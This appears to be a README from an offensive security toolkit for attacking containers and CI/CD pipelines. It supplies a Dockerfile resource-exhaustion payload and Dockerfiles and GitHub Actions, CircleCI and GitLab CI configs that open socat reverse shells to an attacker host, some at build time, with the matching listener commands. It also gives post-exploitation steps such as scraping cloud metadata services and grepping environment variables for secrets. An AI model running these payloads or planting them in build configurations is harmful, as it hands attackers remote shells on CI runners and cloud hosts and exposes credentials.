## Useful tools

- https://github.com/genuinetools/amicontained
- https://github.com/brompwnie/botb
- https://github.com/wagoodman/dive


### Dockerfile Recursive Resource Exhaustion 
```
FROM docker
RUN mkdir /app
WORKDIR /app
RUN touch evulbin
RUN echo '#!/bin/sh' >> evulbin
RUN echo 'tr | tr' >> evulbin
RUN chmod +x /app/evulbin
RUN cp /app/evulbin /usr/bin/tr
RUN cp /app/evulbin /bin/cat
RUN cat
```

### Docker Image with CMD SOCAT command (plaintext)
Build this image and receive a plaintext connection to your SOCAT handler when the image is run for a Container. 
```
FROM ubuntu:latest
RUN  apt update && apt install -y socat
CMD socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:x.x.x.x:5556

```

To receive the shell from your SOCAT command above, run the following command on your jumpbox:

```
socat file:`tty`,raw,echo=0 tcp-listen:5556 
```

### Docker Image with RUN SOCAT command (mTLS)

Setup the TLS certificates for the server:

```
openssl genrsa -out server.key 4096
openssl req -new -key server.key -x509 -days 15 -out server.crt -subj "/C=RU/ST=x/L=x/O=x Network/OU=IT Department/CN=someserver.online.com"
cat server.key server.crt >server.pem
chmod 600 server.key server.pem
```

Setup the TLS certificates for the client:

```
openssl genrsa -out client.key 4096
openssl req -new -key client.key -x509 -days 15 -out client.crt -subj "/C=RU/ST=x/L=x/O=x Network/OU=IT Department/CN=someserver.online.com"
cat client.key client.crt >client.pem
chmod 600 client.key client.pem
```

Build this image and receive a mTLS authenticated connection to your SOCAT handler when the image is built via docker build. 
```
FROM ubuntu:latest

ENV RHOST yourserver.somewhere.com
ENV RPORT 443

RUN  apt update && apt install -y socat

COPY server.crt /server.crt
COPY client.pem /client.pem

RUN socat exec:'bash -li',pty,stderr,setsid,sigint,sane openssl-connect:$RHOST:$RPORT,cert=/client.pem,cafile=/server.crt 

```

To receive the shell from your SOCAT command above, run the following command on your jumpbox:
Make sure you copied *client.crt* and *server.pem* to the jumpbox.

```
socat file:`tty`,raw,echo=0 openssl-listen:443,reuseaddr,cert=server.pem,cafile=client.crt
```

### Github Actions Worklow to get a shell (plaintext)
Define a workflow by inserting the following contents into a YML file i.e go.yml. This workflow will trigger on a PUSH to the repo and execute the SOCAT command to your jumpbox.

```
name: Go
on: [push]
jobs:
  build:
    name: Build
    runs-on: ubuntu-latest
    steps:
    - name: Get A Shell
      run: |
        sudo apt install -y socat
        socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:x.x.x.x:55556
```

To receive the shell from your SOCAT command above, run the following command on your jumpbox:

```
socat file:`tty`,raw,echo=0 tcp-listen:55555 
```


### CircleCI Build Step to get a shell (plaintext)
Define a workflow by inserting the following contents into a YML file i.e go.yml. This workflow will trigger on a PUSH to the repo and execute the SOCAT command to your jumpbox. Also, you can just run your build step with SSH access which is available via the webui.

```
version: 2
jobs:
  build:
    machine:
    steps:
      - checkout
      - run: socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:x.x.x.x:55555
```

To receive the shell from your SOCAT command above, run the following command on your jumpbox:

```
socat file:`tty`,raw,echo=0 tcp-listen:55555 
```

### gitlab-ci.yml to get a shell (plaintext)

The [gitlab-ci.yml](gitlab/gitlab-ci.yml) file can be used in your git repo as .gilab-ci.yml to receive a reverse pty shell: 

```
docker-build:
  # Official docker image.
  image: docker:latest
  stage: build
  services:
    - docker:dind
      #  before_script:
      #- docker login -u "$CI_REGISTRY_USER" -p "$CI_REGISTRY_PASSWORD" $CI_REGISTRY
  script:
    - apk update
    - apk add socat bash
    - /usr/bin/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:your.host.invalid:4444

```

To receive the shell from your SOCAT command above, run the following command on your jumpbox:

```
socat file:`tty`,raw,echo=0 tcp-listen:55555 
```

## Post Exploitation Techniques

### Identify what you are running in 
Are you running in a Container? Docker? LXC? VM?
Running [amIContained](https://github.com/genuinetools/amicontained) will help you determine this by running:

```
root@2a16ee24d301:/# ./amicontained-linux-amd64 
Container Runtime: docker
Has Namespaces:
        pid: true
        user: false
AppArmor Profile: unconfined
Capabilities:
        BOUNDING -> chown dac_override fowner fsetid kill setgid setuid setpcap net_bind_service net_raw sys_chroot mknod audit_write setfcap
Seccomp: filtering
Blocked Syscalls (64):
        MSGRCV SYSLOG SETSID USELIB USTAT SYSFS VHANGUP PIVOT_ROOT _SYSCTL ACCT SETTIMEOFDAY MOUNT UMOUNT2 SWAPON SWAPOFF REBOOT SETHOSTNAME SETDOMAINNAME IOPL IOPERM CREATE_MODULE INIT_MODULE 
DELETE_MODULE GET_KERNEL_SYMS QUERY_MODULE QUOTACTL NFSSERVCTL GETPMSG PUTPMSG AFS_SYSCALL TUXCALL SECURITY LOOKUP_DCOOKIE CLOCK_SETTIME VSERVER MBIND SET_MEMPOLICY GET_MEMPOLICY KEXEC_LOAD ADD
_KEY REQUEST_KEY KEYCTL MIGRATE_PAGES UNSHARE MOVE_PAGES PERF_EVENT_OPEN FANOTIFY_INIT NAME_TO_HANDLE_AT OPEN_BY_HANDLE_AT CLOCK_ADJTIME SETNS PROCESS_VM_READV PROCESS_VM_WRITEV KCMP FINIT_MODU
LE KEXEC_FILE_LOAD BPF USERFAULTFD MEMBARRIER PKEY_MPROTECT PKEY_ALLOC PKEY_FREE IO_PGETEVENTS RSEQ
Looking for Docker.sock
root@2a16ee24d301:/# 
```

You can get amIContained from here: https://github.com/genuinetools/amicontained

### Identify your cloud via egress
Making an outbound request can help you determine which cloud you are located on according to your outbound IP address.
```
# curl ifconfig.io
34.207.33.232

whois 34.207.33.232
...
OrgName:        Amazon Technologies Inc.
OrgId:          AT-88-Z
Address:        410 Terry Ave N.
City:           Seattle
StateProv:      WA
PostalCode:     98109
Country:        US
RegDate:        2011-12-08
Updated:        2019-07-25
Comment:        All abuse reports MUST include:
Comment:        * src IP
Comment:        * dest IP (your IP)
Comment:        * dest port
Comment:        * Accurate date/timestamp and timezone of activity
Comment:        * Intensity/frequency (short log extracts)
Comment:        * Your contact details (phone and email) Without these we will be unable to identify the correct owner of the IP address at that point in time.
Ref:            https://rdap.arin.net/registry/entity/AT-88-Z
...

```
### Metadata Services
Metadata services can help you determine the cloud you are located on. Metadata services can also assist you in exploiting the environment further via gathering information from the metadata service. Multiple clouds use the same metadata service idenitier 169.254.169.254 however they all have different structures and capabilities.

Determine the presence of a metadata service, this can be done with BOtB:

```
./bob_linux_amd64 -metadata=true                    
[+] Break Out The Box
[*] Attempting to query metadata endpoint: 'http://169.254.169.254/latest/meta-data/'
[!] Response from 'http://169.254.169.254/' -> 200
[+] Finished
```

GCP Legacy Metadata services can also have their data scraped via the service on port 80 and not specifying the Host header. This can be done with BOtB:

```
#  ./botb_linux_amd64 -scrape-gcp=true
[+] Break Out The Box
[+] Attempting to connect to:  169.254.169.254:80

[*] Output->
 HTTP/1.0 200 OK
Metadata-Flavor: Google
Content-Type: application/text
Date: Sun, 30 Jun 2019 21:53:41 GMT
Server: Metadata Server for VM
Connection: Close
Content-Length: 21013
X-XSS-Protection: 0
X-Frame-Options: SAMEORIGIN

0.1/meta-data/attached-disks/disks/0/deviceName persistent-disk-0
0.1/meta-data/attached-disks/disks/0/index 0
0.1/meta-data/attached-disks/disks/0/mode READ_WRITE
.....

```

### Environment Variables
Environment variables often include values that can assist you in multiple ways. 

For example, You can identify the location of a Docker daemon via the ENV entry ```DOCKER_HOST```.

You can also grep the ENV for interesting values:
```
# ENV | grep cloud
# ENV | grep runtime
# ENV | grep secret
```

For checking for leaked/forgotten build variables, [env-var-leakage](./env-var-leakage/README.md) can be used.

### Network Interfaces
Network interfaces provide valuable information.

If you are on EC2 classic, all hosts are on a flat network, you can test this for the presence of other hosts on your network.

Network interfaces are also commonly named after useful services i.e docker

```
# ip addr show
2: docker0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN group default
    link/ether 02:42:89:83:1b:3f brd ff:ff:ff:ff:ff:ff
    inet 172.18.0.1/16 brd 172.18.255.255 scope global docker0
       valid_lft forever preferred_lft forever
```


### File System
If you are in a container, you can determine your containers location on the host file system by analysing the mount entries.

```
# mount | grep overlay2
/var/lib/docker/overlay2/l/VNX3UPRRKNQBKOWOCTTKT4UL6H,upperdir=/var/lib/docker/overlay2/825fd05edfbc4a36676400ee90c69bdb6b20b005ca8029a9abba5a76429321d8/diff,workdir=/var/lib/docker/overlay2/825fd05edfbc4a36676400ee90c69bdb6b20b005ca8029a9abba5a76429321d8/work
```
The above indicates that the container is located at ```/var/lib/docker/overlay2/825fd05edfbc4a36676400ee90c69bdb6b20b005ca8029a9abba5a76429321d8``` on the container runtime host.

###


